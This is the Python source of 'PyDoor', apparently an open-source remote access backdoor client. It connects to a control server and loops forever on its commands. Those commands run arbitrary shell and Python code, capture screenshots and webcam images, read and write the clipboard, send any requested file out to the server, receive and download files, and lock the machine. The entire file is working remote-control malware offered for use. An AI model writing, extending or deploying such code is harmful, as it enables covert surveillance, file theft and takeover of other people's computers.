""" PyDoor Client """
import json
import logging
import subprocess
import queue
from contextlib import suppress

from cryptography.hazmat.primitives.asymmetric import ec
from modules import clipboard, download, screen, webcam, windows, pyshell
from utils.baseclient import BaseClient
from utils import tasks

logging.basicConfig(level=logging.DEBUG)

BLOCK_SIZE = 32768

class Client(BaseClient):
    """ Client for managing commands """

    # List of tasks that have output, but timed out
    task_list: list[tasks.Task] = []

    def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
        BaseClient.__init__(self, public_key)

    def listen(self) -> None:
        """ Listen for coming commands """
        # Wait for a command to arrive
        command = self.read().decode()
        match command:
            case 'PING':
                self.ping()
            case 'SHELL':
                self.shell()
            case 'PYTHON':
                self.interpreter()
            case 'SCREENSHOT':
                self.screenshot()
            case 'WEBCAM':
                self.webcam()
            case 'COPY':
                self.copy()
            case 'PASTE':
                self.paste()
            case 'SEND_FILE':
                self.send_file()
            case 'RECEIVE_FILE':
                self.receive_file()
            case 'DOWNLOAD':
                self.download()
            case 'LOCK':
                self.lock()
            case 'TASKS':
                self.tasks()
            case 'STOPTASK':
                self.stoptask()
            case 'TASKOUTPUT':
                self.taskoutput()
            case _:
                logging.debug('Received unrecognized command: %s', command)

    def ping(self) -> None:
        """ Respond to server ping """
        self.write(b'PONG')

    def shell(self) -> None:
        """ Open a shell for peer """
        command = self.read().decode()
        logging.info('Executing shell command: %s', command)
        output = subprocess.run(command, shell=True, capture_output=True, check=False)
        self.write(output.stdout + output.stderr)

    def interpreter(self) -> None:
        """ Open python interpreter for peer """
        command = self.read().decode()

        # Create task
        task = pyshell.pyshell(command)
        self.task_list.append(task)

        # Define a timeout for the command
        timeout = 60

        try:
            output: str = task.output.get(timeout=timeout)
        except queue.Empty:
            self.write(f'Timed out after {timeout}s.'.encode())
        else:
            self.task_list.remove(task)
            self.write(output.encode())

    def screenshot(self) -> None:
        """ Take a screenshot """
        logging.debug('Capturing screenshot')
        try:
            data = screen.screenshot()
        except RuntimeError as error:
            error_message = f'{error.__class__.__name__}: {str(error)}'
            logging.error('Error taking screenshot: %s', error_message)
            data = ('ERROR: ' + error_message).encode()
        else:
            logging.info('Successfully captured screenshot')
        self.write(data)

    def webcam(self) -> None:
        """ Capture webcam """
        logging.debug('Capturing webcam')
        try:
            img_data = webcam.capture_webcam()
        except RuntimeError:
            logging.error('Could not capture webcam')
            img_data = b'ERROR'
        else:
            logging.info('Captured webcam')
        self.write(img_data)

    def copy(self) -> None:
        """ Copy to clipboard """
        logging.debug('Attempting to copy to clipboard')
        data = self.read().decode()
        try:
            clipboard.copy(data)
        except RuntimeError as error:
            logging.error('Error occurred copying to clipboard: %s', str(error))
            self.write(str(error).encode())
        else:
            logging.info('Copied "%s" to clipboard', data)
            self.write(b'SUCCESS')

    def paste(self) -> None:
        """ Paste from clipboard """
        logging.debug('Attempting to paste from clipboard')
        try:
            content = clipboard.paste()
        except RuntimeError as error:
            logging.error('Error occurred pasting from clipboard: %s', str(error))
            self.write(b'ERROR')
            self.write(str(error).encode())
        else:
            if content is None:
                content = ''
            logging.info('Pasted "%s" from clipboard', content)
            self.write(content.encode())

    def send_file(self) -> None:
        """ Send a file to server """
        logging.debug('Sending file to server')
        filename = self.read().decode()
        try:
            with open(filename, 'rb') as file:
                while True:
                    block = file.read(BLOCK_SIZE)
                    if not block:
                        break
                    self.write(block)

        except (FileNotFoundError, PermissionError) as error:
            logging.error('Error opening file %s: %s', filename, str(error))
            self.write(b'ERROR')
            self.write(f'{error.__class__.__name__}: {str(error)}'.encode())
        else:
            self.write(b'FILE_TRANSFER_DONE')
            logging.info('Successfully transferred file %s to server', str(filename))

    def receive_file(self) -> None:
        """ Receive file from server """
        logging.debug('Attempting to receive file from server')
        filename = self.read().decode()
        try:
            with open(filename, 'wb') as file:
                self.write(b'FILE_OPENED')
                while True:
                    block = self.read()
                    if block == b'FILE_TRANSFER_DONE':
                        break
                    file.write(block)

        except (PermissionError) as error:
            logging.error('Error receiving file from server: %s', str(error))
            self.write(f'{error.__class__.__name__}: {str(error)}')

    def download(self) -> None:
        """ Download a file from the web """
        logging.debug("Attempting to download file from the web")
        url, filename = json.loads(self.read().decode())

        try:
            task = download.download(url, filename)
        except TimeoutError:
            logging.error("Download of '%s' timed out", url)
            self.write(b"Download timed out.")
        except (RuntimeError, OSError) as error:
            logging.error("Error downloading file from the web: %s", str(error))
            self.write(str(error).encode())
        else:
            # Add task to task_list
            self.task_list.append(task)
            logging.info("Downloading file from '%s' as '%s'", url, filename)
            self.write(b'Success')

    def lock(self) -> None:
        """ Lock Machine (Windows only) """
        logging.debug("Attempting to lock machine")

        try:
            windows.lock()
        except AttributeError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(b"Locking is only supported on Windows.")
        except OSError as error:
            logging.error("Could not lock machine: %s", str(error))
            self.write(str(error).encode())
        else:
            logging.info("Locked machine")
            self.write(b'LOCKED')

    def tasks(self) -> None:
        """ Get current tasks (background threads), removes fully processed ones """
        task_info = []
        tasks.clean(self.task_list)
        # Create a copy to make sure removing items does not interfere with looping
        task_list = self.task_list.copy()
        for task in task_list:

            info = [task.identifer, task.native_id if task.is_alive() else None]
            info.extend(json.loads(task.name))

            task_info.append(info)

        self.write(json.dumps(task_info).encode())

    def stoptask(self) -> None:
        """ Stop a running task """
        task_id = self.read().decode()
        logging.debug("Attempting to stop task (%s)", task_id)

        task: tasks.Task = tasks.find(self.task_list, task_id)

        if task is None:
            self.write(b'Task could not be found.')
            logging.debug("Task (%s) could not be found.", task_id)
            return

        if task.stop is None:
            self.write(b'Task does not support stopping.')
            logging.debug("Task %s (%s) does not support stopping. ", task.name, task_id)
            return

        # Stop task
        task.stop.set()
        logging.debug("Task stopped: %s (%s)", task.name, task_id)
        self.write(b'STOPPED')

    def taskoutput(self) -> None:
        """ Get the output of a task if available """
        task_id = self.read().decode()
        logging.debug("Attempting to get task (%s) output", task_id)

        task: tasks.Task = tasks.find(self.task_list, task_id)

        if task is None:
            self.write(b'Task could not be found.')
            logging.debug("Task (%s) could not be found.", task_id)
            return

        if task.output is None:
            self.write(b'Task does not support output.')
            logging.debug("Task (%s) does not return output.", task_id)
            return

        if task.output.qsize() == 0:
            self.write(b'Task is not ready.')
            logging.debug("Task (%s) is not ready", task_id)
            return

        output: str = task.output.get()
        logging.debug("Task (%s) output: %s", task_id, output)
        self.write(b'READY')
        self.write(output.encode())


if __name__ == '__main__':

    from cryptography.hazmat.primitives import serialization

    # Read certificate from file
    with open('public.pem', 'rb') as cert_file:
        pubkey = serialization.load_pem_public_key(cert_file.read())

    # Connect to server
    client = Client(pubkey)
    client.connect(('localhost', 6969))

    # Listen to commands indefinitely
    while True:
        with suppress(TimeoutError):
            client.listen()
